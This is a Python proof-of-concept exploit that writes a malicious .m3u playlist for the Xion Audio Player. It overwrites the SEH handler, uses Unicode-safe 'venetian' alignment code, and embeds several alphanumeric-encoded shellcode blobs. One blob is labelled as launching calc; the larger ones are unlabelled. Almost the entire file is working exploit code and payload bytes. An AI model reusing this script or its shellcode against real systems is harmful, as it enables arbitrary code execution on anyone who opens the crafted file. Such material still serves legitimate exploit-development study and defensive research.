import struct

total = 5000
fuzz = "A" * 206
#fuzz += "\x41\x41"
#replaced with NOP like instruction
fuzz += "\x61\x62" #overwrite nSEH, \x61 (popad - pop all general purposes registers), \x62 (nop/align)
# pop pop ret = 0x00450015
fuzz += "\x15\x45" #overwrite SEH
#the ebp remains the same pointing to 0012f2ac
# which is pointing to nseh
# put to eax then add 100 so it will point to +100 after ebp

#push ebp
#pop eax
#add eax,0x11001400
#sub eax,0x11001300

#push eax
#ret

#venetian shellcode of push ebp+100 to eax
fuzz += "D" #first D found in the 1500 45004400 (because it is used as part of the offset in the instruction that is executed at SE Handler"
fuzz += "\x6e" #nop align 006e00
fuzz += "\x55" #push ebp 55
fuzz += "\x6e" #nop align 006e00
fuzz += "\x58" #pop eax 58
fuzz += "\x6e" #nop align
fuzz += "\x05\x14\x11" # add eax, 0x11001400 0500 14001100
fuzz += "\x6e" #nop align 006e00
fuzz += "\x2d\x13\x11" #sub eax;0x11001300 2d00 13001100
fuzz += "\x6e"

#then the venetian jumpcode
fuzz += "\x50"
fuzz += "\x6d"
fuzz += "\xc3"

fuzz += "D" * 107 # padding
#shellcode, length = 717
shellcode = ("\x89\xe1\xda\xc1\xd9\x71\xf4\x5b\x53\x59\x49\x49\x49\x49\x43"
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34"
"\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"
"\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
"\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d\x38\x4d\x52\x55\x50"
"\x55\x50\x53\x30\x35\x30\x4c\x49\x5a\x45\x36\x51\x39\x50\x45"
"\x34\x4c\x4b\x30\x50\x50\x30\x4c\x4b\x51\x42\x54\x4c\x4c\x4b"
"\x31\x42\x52\x34\x4c\x4b\x54\x32\x56\x48\x44\x4f\x4f\x47\x31"
"\x5a\x46\x46\x50\x31\x4b\x4f\x4e\x4c\x47\x4c\x33\x51\x53\x4c"
"\x35\x52\x46\x4c\x57\x50\x39\x51\x58\x4f\x34\x4d\x33\x31\x4f"
"\x37\x4b\x52\x5a\x52\x30\x52\x36\x37\x4c\x4b\x51\x42\x44\x50"
"\x4c\x4b\x31\x5a\x47\x4c\x4c\x4b\x30\x4c\x34\x51\x54\x38\x4b"
"\x53\x51\x58\x35\x51\x58\x51\x36\x31\x4c\x4b\x31\x49\x31\x30"
"\x53\x31\x58\x53\x4c\x4b\x51\x59\x34\x58\x4d\x33\x36\x5a\x51"
"\x59\x4c\x4b\x37\x44\x4c\x4b\x53\x31\x38\x56\x56\x51\x4b\x4f"
"\x4e\x4c\x49\x51\x58\x4f\x54\x4d\x45\x51\x49\x57\x37\x48\x4d"
"\x30\x53\x45\x4c\x36\x35\x53\x53\x4d\x4a\x58\x37\x4b\x53\x4d"
"\x37\x54\x53\x45\x4a\x44\x46\x38\x4c\x4b\x46\x38\x37\x54\x35"
"\x51\x58\x53\x32\x46\x4c\x4b\x44\x4c\x30\x4b\x4c\x4b\x51\x48"
"\x35\x4c\x33\x31\x39\x43\x4c\x4b\x35\x54\x4c\x4b\x55\x51\x38"
"\x50\x4d\x59\x31\x54\x31\x34\x51\x34\x51\x4b\x51\x4b\x33\x51"
"\x50\x59\x31\x4a\x46\x31\x4b\x4f\x4b\x50\x31\x4f\x51\x4f\x30"
"\x5a\x4c\x4b\x34\x52\x5a\x4b\x4c\x4d\x51\x4d\x52\x48\x56\x53"
"\x50\x32\x33\x30\x33\x30\x35\x38\x34\x37\x42\x53\x47\x42\x51"
"\x4f\x36\x34\x55\x38\x50\x4c\x43\x47\x51\x36\x33\x37\x4b\x4f"
"\x38\x55\x48\x38\x4a\x30\x43\x31\x33\x30\x45\x50\x56\x49\x38"
"\x44\x30\x54\x56\x30\x43\x58\x47\x59\x4b\x30\x32\x4b\x55\x50"
"\x4b\x4f\x59\x45\x56\x30\x56\x30\x36\x30\x30\x50\x51\x50\x50"
"\x50\x37\x30\x56\x30\x32\x48\x4b\x5a\x44\x4f\x49\x4f\x4d\x30"
"\x4b\x4f\x4e\x35\x4c\x57\x53\x5a\x43\x35\x45\x38\x45\x5a\x45"
"\x50\x34\x42\x34\x45\x33\x58\x33\x32\x45\x50\x55\x51\x4f\x4b"
"\x4d\x59\x4b\x56\x53\x5a\x32\x30\x46\x36\x30\x57\x33\x58\x4c"
"\x59\x39\x35\x42\x54\x55\x31\x4b\x4f\x59\x45\x4b\x35\x49\x50"
"\x33\x44\x34\x4c\x4b\x4f\x30\x4e\x53\x38\x53\x45\x5a\x4c\x45"
"\x38\x4a\x50\x4e\x55\x39\x32\x30\x56\x4b\x4f\x59\x45\x43\x58"
"\x42\x43\x52\x4d\x42\x44\x45\x50\x4d\x59\x4a\x43\x46\x37\x36"
"\x37\x51\x47\x46\x51\x4a\x56\x42\x4a\x52\x32\x36\x39\x51\x46"
"\x4b\x52\x4b\x4d\x45\x36\x39\x57\x57\x34\x37\x54\x37\x4c\x45"
"\x51\x35\x51\x4c\x4d\x50\x44\x51\x34\x52\x30\x59\x56\x55\x50"
"\x47\x34\x50\x54\x56\x30\x51\x46\x31\x46\x50\x56\x47\x36\x30"
"\x56\x50\x4e\x50\x56\x31\x46\x50\x53\x46\x36\x55\x38\x43\x49"
"\x48\x4c\x57\x4f\x4c\x46\x4b\x4f\x38\x55\x4b\x39\x4b\x50\x30"
"\x4e\x50\x56\x31\x56\x4b\x4f\x30\x30\x55\x38\x44\x48\x4c\x47"
"\x35\x4d\x33\x50\x4b\x4f\x48\x55\x4f\x4b\x4a\x50\x4f\x45\x59"
"\x32\x51\x46\x53\x58\x4f\x56\x4a\x35\x4f\x4d\x4d\x4d\x4b\x4f"
"\x48\x55\x37\x4c\x45\x56\x43\x4c\x35\x5a\x4d\x50\x4b\x4b\x4b"
"\x50\x44\x35\x45\x55\x4f\x4b\x31\x57\x55\x43\x53\x42\x32\x4f"
"\x52\x4a\x53\x30\x30\x53\x4b\x4f\x4e\x35\x41\x41")
#calc
calc = ("PPYAIAIAIAIAQATAXAZAPA3QADAZA"
"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA"
"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB"
"AB30APB944JBKLK8U9M0M0KPS0U99UNQ8RS44KPR004K"
"22LLDKR2MD4KCBMXLOGG0JO6NQKOP1WPVLOLQQCLM2NL"
"MPGQ8OLMM197K2ZP22B7TK0RLPTK12OLM1Z04KOPBX55"
"Y0D4OZKQXP0P4KOXMHTKR8MPKQJ3ISOL19TKNTTKM18V"
"NQKONQ90FLGQ8OLMKQY7NXK0T5L4M33MKHOKSMND45JB"
"R84K0XMTKQHSBFTKLL0KTK28MLM18S4KKT4KKQXPSYOT"
"NDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM2JKQTMSU"
"89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU7MEM"
"KOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC"
"QQ2LRCM0LJA")

#badchar = \x00,\x0a,\x0d
#fuzz += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"

fuzz += ("\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x51\x41\x54"
"\x41\x58\x41\x5a\x41\x50\x55\x33\x51\x41\x44\x41\x5a\x41\x42"
"\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51\x41\x49\x41\x51\x41"
"\x50\x41\x35\x41\x41\x41\x50\x41\x5a\x31\x41\x49\x31\x41\x49"
"\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41\x58\x41\x35\x38"
"\x41\x41\x50\x41\x5a\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51"
"\x49\x41\x49\x51\x49\x31\x31\x31\x31\x41\x49\x41\x4a\x51\x49"
"\x31\x41\x59\x41\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x33"
"\x30\x41\x50\x42\x39\x34\x34\x4a\x42\x53\x59\x39\x57\x38\x5a"
"\x5a\x32\x5a\x39\x53\x47\x4b\x44\x31\x4d\x52\x35\x32\x39\x30"
"\x49\x4f\x59\x50\x49\x31\x39\x30\x49\x50\x49\x30\x49\x51\x39"
"\x30\x49\x31\x39\x4f\x53\x31\x33\x50\x43\x30\x43\x31\x33\x51"
"\x33\x4f\x47\x50\x51\x51\x4a\x31\x5a\x4f\x51\x42\x38\x32\x30"
"\x4e\x50\x4f\x51\x4e\x50\x31\x31\x32\x4b\x31\x31\x31\x31\x50"
"\x51\x50\x32\x4f\x51\x50\x42\x4f\x42\x30\x42\x4f\x52\x50\x30"
"\x4f\x52\x4f\x52\x31\x31\x31\x32\x51\x48\x52\x30\x30\x38\x51"
"\x31\x51\x32\x32\x55\x30\x4a\x31\x39\x51\x39\x30\x4d\x54\x39"
"\x52\x33\x30\x4b\x32\x49\x54\x31\x42\x44\x30\x31\x4e\x54\x32"
"\x4b\x51\x34\x30\x4d\x42\x4e\x31\x47\x52\x4d\x53\x31\x4f\x46"
"\x52\x55\x30\x47\x53\x34\x42\x37\x42\x52\x43\x4a\x30\x44\x34"
"\x31\x4f\x49\x51\x49\x52\x4c\x54\x31\x4e\x52\x33\x42\x42\x4b"
"\x50\x33\x32\x58\x52\x4a\x51\x49\x42\x4c\x43\x36\x32\x31\x31"
"\x32\x51\x42\x30\x32\x30\x33\x53\x36\x53\x33\x31\x32\x50\x4f"
"\x30\x44\x43\x45\x54\x39\x51\x55\x42\x4a\x31\x32\x4f\x52\x30"
"\x53\x33\x38\x52\x31\x53\x43\x30\x4b\x34\x36\x52\x4c\x50\x4c"
"\x50\x4b\x32\x45\x44\x32\x31\x47\x42\x4c\x52\x4f\x43\x44\x51"
"\x32\x50\x4e\x43\x42\x4f\x43\x42\x55\x50\x4c\x51\x59\x52\x42"
"\x50\x4b\x30\x4b\x31\x55\x32\x34\x42\x4c\x32\x4c\x34\x34\x50"
"\x30\x50\x4d\x52\x59\x50\x4e\x30\x48\x50\x42\x32\x47\x42\x39"
"\x4f\x54\x32\x51\x31\x39\x32\x34\x52\x5a\x51\x36\x30\x45\x51"
"\x58\x42\x51\x52\x42\x50\x4e\x50\x4c\x50\x4b\x50\x4b\x30\x30"
"\x42\x51\x30\x37\x32\x42\x33\x31\x51\x34\x30\x4c\x30\x4d\x43"
"\x38\x42\x56\x42\x54\x53\x39\x32\x30\x52\x4c\x50\x4e\x31\x4a"
"\x32\x43\x32\x37\x4f\x48\x53\x37\x51\x42\x50\x4c\x42\x4e\x42"
"\x34\x30\x4b\x32\x4d\x30\x4d\x53\x44\x33\x33\x52\x38\x44\x37"
"\x50\x32\x32\x36\x50\x42\x30\x4c\x44\x30\x52\x51\x30\x4d\x52"
"\x50\x31\x59\x42\x4d\x31\x38\x30\x43\x52\x51\x33\x45\x51\x39"
"\x30\x55\x53\x43\x42\x58\x51\x38\x31\x48\x52\x56\x42\x4e\x50"
"\x4f\x52\x45\x52\x43\x42\x4d\x53\x36\x4f\x48\x50\x48\x42\x53"
"\x30\x42\x50\x4e\x31\x33\x32\x4f\x32\x50\x30\x49\x51\x39\x50"
"\x32\x52\x4d\x4e\x55\x31\x54\x4f\x56\x32\x37\x4f\x49\x52\x51"
"\x52\x35\x31\x51\x4f\x49\x50\x57\x31\x33\x32\x4b\x44\x30\x30"
"\x33\x52\x4d\x43\x34\x52\x4e\x52\x33\x50\x4e\x52\x4e\x42\x5a"
"\x51\x48\x52\x36\x50\x4e\x53\x34\x52\x4b\x31\x34\x52\x47\x52"
"\x4d\x34\x35\x52\x4e\x33\x39\x51\x35\x30\x4a\x32\x35\x31\x38"
"\x30\x32\x51\x33\x50\x4f\x44\x39\x30\x49\x42\x33\x4e\x57\x30"
"\x4a\x32\x4a\x30\x4d\x42\x48\x30\x39\x30\x4e\x31\x38\x53\x47"
"\x32\x4d\x32\x49\x42\x4e\x52\x30\x42\x37\x32\x4c\x30\x4d\x32"
"\x35\x50\x4e\x51\x49\x4e\x57\x53\x47\x44\x31\x50\x4e\x54\x33"
"\x53\x31\x4f\x42\x42\x4f\x52\x4c\x52\x33\x42\x5a\x32\x38\x31"
"\x32\x4f\x42\x42\x4c\x30\x37\x53\x43\x50\x4f\x30\x4c\x4f\x48"
"\x43\x4a\x51\x47\x51\x52\x50\x4e\x42\x59\x33\x34\x42\x4c\x50"
"\x36\x30\x4f\x30\x4c\x32\x4d\x30\x35\x52\x36\x30\x32\x50\x47"
"\x42\x4b\x43\x47\x4f\x42\x51\x37\x50\x59\x52\x59\x54\x39\x50"
"\x37\x42\x37\x50\x5a\x42\x4f\x30\x38\x50\x4c\x31\x55\x32\x4d"
"\x52\x4c\x32\x4e\x50\x4e\x32\x4b\x43\x49\x52\x5a\x32\x4d\x31"
"\x39\x42\x4b\x30\x5a\x30\x51\x52\x38\x52\x4c\x30\x52\x30\x4c"
"\x43\x48\x54\x30\x50\x56\x31\x35\x32\x4e\x30\x4e\x30\x4b\x4f"
"\x5a\x42\x5a\x51\x44\x53\x48\x32\x4d\x50\x4f\x53\x35\x31\x49"
"\x50\x4f\x51\x51\x32\x4e\x4f\x45\x42\x4c\x50\x34\x50\x51\x50"
"\x33\x32\x59\x42\x48\x32\x38\x30\x31\x42\x44\x33\x49\x4e\x54"
"\x30\x4e\x4e\x53\x30\x32\x50\x53\x33\x42\x34\x32\x43\x46\x51"
"\x37\x31\x59\x52\x30\x44\x31\x51\x34\x4e\x50\x31\x58\x44\x39"
"\x30\x4e\x52\x31\x50\x37\x32\x4d\x42\x50\x50\x38\x32\x31\x32"
"\x42\x42\x55\x50\x4c\x52\x4a\x33\x4a\x52\x57\x30\x4f\x30\x4d"
"\x33\x49\x50\x4b\x31\x58\x4e\x50\x53\x44\x30\x4f\x50\x4e\x34"
"\x36\x50\x32\x51\x52\x4f\x49\x33\x31\x50\x4d\x51\x33\x50\x35"
"\x52\x53\x4f\x46\x51\x51\x50\x59\x51\x38\x53\x45\x30\x4e\x30"
"\x4c\x31\x44\x42\x47\x32\x33\x4e\x52\x42\x36\x51\x55\x42\x30"
"\x42\x30\x51\x39\x52\x42\x50\x4b\x50\x35\x53\x33\x32\x45\x4f"
"\x59\x42\x4e\x30\x4e\x50\x4d\x53\x42\x50\x45\x50\x53\x4f\x45"
"\x30\x4d\x32\x4e\x4f\x55\x30\x4d\x43\x46\x52\x4e\x44\x32\x32"
"\x4f\x4f\x44\x44\x31\x54\x33\x42\x51\x51\x46\x30\x4e\x30\x32"
"\x32\x30\x52\x4f\x42\x4b\x31\x38\x42\x4a\x51\x48\x50\x45\x42"
"\x4c\x50\x4b\x4f\x52\x32\x4c\x43\x45\x30\x4f\x30\x37\x42\x4a"
"\x30\x5a\x30\x31\x50\x4b\x4e\x59\x42\x51\x53\x37\x33\x36\x52"
"\x58\x30\x4a\x4e\x55\x42\x4c\x30\x50\x50\x37\x50\x4c\x50\x4d"
"\x4f\x55\x51\x44\x4e\x53\x44\x39\x43\x38\x42\x56\x50\x32\x44"
"\x38\x44\x30\x42\x36\x50\x4c\x52\x4d\x51\x35\x50\x48\x50\x4b"
"\x44\x30\x32\x39\x54\x39\x50\x36\x50\x36\x42\x44\x4f\x42\x30"
"\x33\x30\x32\x32\x34\x30\x5a\x31\x53\x4e\x56\x31\x57\x30\x4d"
"\x30\x4f\x30\x33\x30\x4b\x31\x57\x50\x44\x34\x38\x51\x39\x30"
"\x31\x44\x38\x30\x49\x31\x51\x43\x36\x51\x36\x30\x4d\x32\x4e"
"\x51\x4a\x4e\x58\x50\x30\x50\x4c\x31\x32\x50\x34\x51\x42\x51"
"\x39\x32\x49\x4e\x56\x50\x30\x32\x5a\x4f\x46\x50\x50\x30\x39"
"\x43\x35\x50\x44\x42\x55\x50\x4d\x50\x31\x50\x4b\x32\x50\x51"
"\x54\x50\x30\x4f\x47\x31\x46\x32\x4d\x32\x4e\x30\x4d\x51\x37"
"\x42\x48\x30\x55\x42\x4e\x33\x48\x31\x38\x4f\x47\x4e\x51\x52"
"\x4d\x4f\x59\x52\x38\x52\x4f\x34\x33\x50\x31\x42\x51\x33\x33"
"\x50\x53\x44\x36\x32\x51\x30\x36\x4e\x55\x34\x32\x42\x49\x30"
"\x54\x52\x47\x51\x4a\x42\x4e\x50\x4e\x31\x36\x42\x50\x32\x34"
"\x32\x4e\x50\x46\x30\x4b\x30\x33\x30\x4c\x31\x43\x30\x51\x42"
"\x42\x50\x4f\x50\x48\x52\x31\x50\x4d\x30\x47\x32\x4b\x52\x37"
"\x50\x4f\x50\x5a\x50\x4c\x50\x35\x53\x31\x4f\x53\x33\x4a\x52"
"\x4a\x31\x39\x32\x32\x32\x5a\x50\x38\x34\x34\x50\x51\x4e\x54"
"\x30\x33\x52\x4b\x33\x46\x30\x54\x50\x4e\x50\x4e\x52\x4d\x50"
"\x4b\x50\x55\x42\x45\x32\x5a\x44\x30\x4f\x46\x50\x57\x4f\x58"
"\x32\x30\x30\x4c\x51\x35\x30\x4e\x51\x36\x50\x44\x33\x47\x52"
"\x55\x52\x4d\x30\x30\x44\x30\x51\x37\x4e\x56\x42\x4b\x50\x39"
"\x34\x38\x43\x38\x4f\x58\x51\x35\x31\x43\x4f\x59\x42\x34\x31"
"\x56\x43\x43\x30\x4d\x30\x4b\x33\x42\x43\x35\x51\x42\x50\x31"
"\x4f\x5a\x34\x35\x50\x4d\x43\x36\x30\x4d\x50\x38\x51\x49\x50"
"\x4b\x42\x4e\x4f\x44\x42\x4d\x34\x30\x53\x34\x43\x42\x51\x53"
"\x43\x31\x42\x46\x32\x4c\x43\x36\x32\x54\x33\x31\x31\x34\x51"
"\x46\x51\x38\x30\x4a\x50\x4c\x52\x4b\x30\x48\x42\x31\x4e\x58"
"\x50\x4d\x42\x53\x4f\x49\x50\x4a\x32\x52\x33\x36\x50\x31\x43"
"\x48\x33\x37\x32\x58\x42\x51\x30\x37\x32\x31\x32\x50\x51\x39"
"\x32\x4b\x50\x32\x42\x58\x42\x54\x31\x52\x30\x4e\x32\x38\x50"
"\x4d\x30\x33\x50\x4f\x50\x4f\x34\x35\x30\x49\x32\x4f\x30\x4d"
"\x31\x58\x51\x43\x50\x4f\x50\x57\x4f\x5a\x30\x39\x32\x4f\x31"
"\x48\x53\x38\x4f\x51\x51\x31\x41\x41")
fuzz += "C" * (total-206-2-2-17-107-1659) 
filename = "C:\Documents and Settings\yunaranyancat\Desktop\XionAudioPlayer\poc.m3u"

with open(filename, 'w') as outfile:
    outfile.write(fuzz)

